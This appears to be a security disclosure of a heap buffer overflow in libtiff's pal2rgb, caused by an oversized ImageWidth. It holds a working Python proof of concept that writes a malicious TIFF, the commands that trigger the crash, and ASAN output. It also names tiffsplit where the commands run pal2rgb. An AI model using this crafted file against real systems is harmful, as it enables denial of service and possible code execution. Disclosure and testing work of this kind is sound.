## Bug0: Heap buffer overflow in pal2rgb main() via TIFFScanlineSize integer overflow writing to malloc(0) obuf

In `tools/pal2rgb.c` `main()`, `TIFFScanlineSize(out)` overflows a `uint32` when `imagewidth` is 178,956,971 (producing a computed size of 0), causing `_TIFFmalloc(0)` to return a 1-byte allocation into which the pixel copy loop subsequently writes approximately 536 MB, resulting in a heap buffer overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

IMAGEWIDTH      = 178956971
IMAGELENGTH     = 1
BITSPERSAMPLE   = 8
COMPRESSION     = 32773  # PackBits
PHOTOMETRIC     = 3      # PALETTE
SAMPLESPERPIXEL = 1
ROWSPERSTRIP    = 1

def packbits_zeros(n):
    full_runs = n // 128
    remainder = n % 128
    data = bytearray(b'\x81\x00' * full_runs)
    if remainder > 0:
        run_header = (1 - remainder) & 0xFF
        data += bytearray([run_header, 0x00])
    return bytes(data)

def build_tiff():
    strip_data = packbits_zeros(IMAGEWIDTH)
    strip_size = len(strip_data)

    ifd_offset   = 8
    num_entries  = 10
    ifd_size     = 2 + num_entries * 12 + 4  # 126 bytes
    colormap_off = ifd_offset + ifd_size      # 134
    strip_off    = colormap_off + 768 * 2     # 1670

    header  = b'\x49\x49'
    header += struct.pack('<H', 42)
    header += struct.pack('<I', ifd_offset)

    ifd_entries = []
    ifd_entries.append(struct.pack('<HHII',  0x0100, 4, 1, IMAGEWIDTH))
    ifd_entries.append(struct.pack('<HHII',  0x0101, 4, 1, IMAGELENGTH))
    ifd_entries.append(struct.pack('<HHIHH', 0x0102, 3, 1, BITSPERSAMPLE, 0))
    ifd_entries.append(struct.pack('<HHIHH', 0x0103, 3, 1, COMPRESSION, 0))
    ifd_entries.append(struct.pack('<HHIHH', 0x0106, 3, 1, PHOTOMETRIC, 0))
    ifd_entries.append(struct.pack('<HHII',  0x0111, 4, 1, strip_off))
    ifd_entries.append(struct.pack('<HHIHH', 0x0115, 3, 1, SAMPLESPERPIXEL, 0))
    ifd_entries.append(struct.pack('<HHII',  0x0116, 4, 1, ROWSPERSTRIP))
    ifd_entries.append(struct.pack('<HHII',  0x0117, 4, 1, strip_size))
    ifd_entries.append(struct.pack('<HHII',  0x0140, 3, 768, colormap_off))

    ifd = struct.pack('<H', num_entries)
    for e in ifd_entries:
        ifd += e
    ifd += struct.pack('<I', 0)

    colormap = b'\x00' * (768 * 2)

    tiff = header + ifd + colormap + strip_data
    with open('poc_input.tif', 'wb') as f:
        f.write(tiff)
    print(f"[+] Written poc_input.tif: {len(tiff)} bytes")

if __name__ == '__main__':
    build_tiff()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/pal2rgb poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000071 at pc 0x561545e30306 bp 0x7ffd087867f0 sp 0x7ffd087867e0
WRITE of size 1 at 0x502000000071 thread T0
    #0 0x561545e30305 in main (pal2rgb+0x8305)
    #1 0x7f85c0acdd8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58

### Impact

An attacker who supplies a crafted TIFF file with an oversized `ImageWidth` field can cause `pal2rgb` to write approximately 536 MB of pixel data into a 1-byte heap allocation, producing a severe heap buffer overflow that corrupts adjacent heap metadata and object contents. This corruption reliably crashes the process (denial of service) and, under controlled heap layout conditions, can overwrite heap management structures in a manner that enables arbitrary code execution. The attack surface is the command-line processing of untrusted TIFF files with no authentication required from the attacker.
